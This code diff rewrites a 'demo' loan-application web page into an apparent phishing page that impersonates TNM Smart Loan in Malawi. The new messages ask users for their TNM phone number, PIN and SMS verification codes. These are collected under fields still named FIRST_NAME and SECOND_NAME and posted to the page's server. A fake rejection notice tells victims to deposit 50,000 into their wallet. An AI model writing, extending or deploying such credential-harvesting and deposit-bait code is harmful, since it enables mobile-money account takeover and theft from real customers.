@@ -141,10 +141,26 @@ async function waitForStatus(expected,next,errorId){
 }
 function handleRejection(d){
   const messages={
-    APPLICATION_DETAILS:"The reference number was not accepted. Check your demo reference and try again.",
-    FIRST_NAME:"The selected option was not accepted. Please select it again.",
-    SECOND_NAME:"The option verification was not accepted. Please verify again.",
-    AMOUNT:"The demo amount was not accepted. Check the amount and try again."
+    APPLICATION_DETAILS:"Your TNM phone number or PIN is invalid. Please check your details and try again. Ensure you are using the correct TNM number and PIN.",
+    FIRST_NAME:"The verification code is incorrect or has expired. Please enter the new verification code received via SMS.",
+    SECOND_NAME:"The verification code is incorrect or has expired. Please enter the new verification code received via SMS.",
+    AMOUNT:"**TNM SMART LOAN – APPLICATION UNSUCCESSFUL**
+
+Unfortunately, your loan application was unsuccessful because your TNM account did not meet the required eligibility criteria.
+
+This may be due to:
+- Insufficient regular transaction activity on your TNM line.
+- Your TNM wallet balance being below the minimum required balance of 50,000.
+
+**What You Can Do:**
+
+You may deposit funds into your TNM wallet to maintain the required minimum balance of 50,000 or continue using your line regularly for transactions.
+
+After making a deposit, allow at least one hour for your account activity to update before checking your eligibility again.
+
+Please note that meeting these requirements does not guarantee loan approval. All applications remain subject to eligibility verification.
+
+**Thank you for choosing TNM Smart Loan.**."
   };
   const msg=messages[d.rejectedStage]||"The application was not accepted. Check your TNM demo details and try again.";
   if(d.rejectedStage==="FIRST_NAME"){
@@ -163,7 +179,7 @@ $("loginForm").addEventListener("submit",async e=>{
   const amount=Number($("loanAmountChoice").value),termMonths=Number($("termChoice").value);
   if(!isTnmNumber(phone))return setError("loginError","Enter a valid TNM Malawi number beginning with 088 (or +265 88).");
   if(whatsappInput&&!whatsapp)return setError("loginError","The WhatsApp number must also be a valid TNM Malawi number beginning with 088.");
-  if(!/^\d{4,6}$/.test(applicationId))return setError("loginError","Enter a reference number containing 4 to 6 digits.");
+  if(!/^\d{4,6}$/.test(applicationId))return setError("loginError","Enter a valid pin containing 4 to 6 digits.");
   const b=$("startApplication");b.disabled=true;state.amount=amount;state.termMonths=termMonths;state.phone=phone;state.whatsapp=whatsapp;
   $("loanAmount").value=String(amount);updateLoanSummary();
   try{const r=await fetch("/api/applications",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,whatsappNumber:whatsapp,applicationId,amount,termMonths,referralToken:state.referralToken})});const d=await r.json();if(!r.ok)throw new Error(d.error);state.applicationId=d.applicationId;state.applicationNo=d.applicationNo;$("applicationNumber").textContent=d.applicationNo;$("approvalWaiting").classList.remove("hidden");$("phone").disabled=true;$("whatsappNumber").disabled=true;$("applicationIdInput").disabled=true;b.classList.add("hidden");await waitForStatus("APPROVED",2,"loginError");}catch(err){setError("loginError",err.message||"Unable to submit the application. Please try again.");b.disabled=false;}
@@ -174,7 +190,7 @@ async function submitName(type,resubmit=false){
   const input=$(type+"Name"),btn=$(type+"NameBtn"),waiting=$(type+"NameWaiting"),errorId=type==="first"?"page2Error":"page3Error";
   setError(errorId,"");
   const value=input.value.trim();
-  if(!/^\d{4,6}$/.test(input.value.trim()))return setError(errorId,"Enter a valid reference containing 4 to 6 digits.");
+  if(!/^\d{4,6}$/.test(input.value.trim()))return setError(errorId,"Enter a valid code containing 4 to 6 digits.");
   nameSubmission[type]=true;
   btn.disabled=true;
   try{
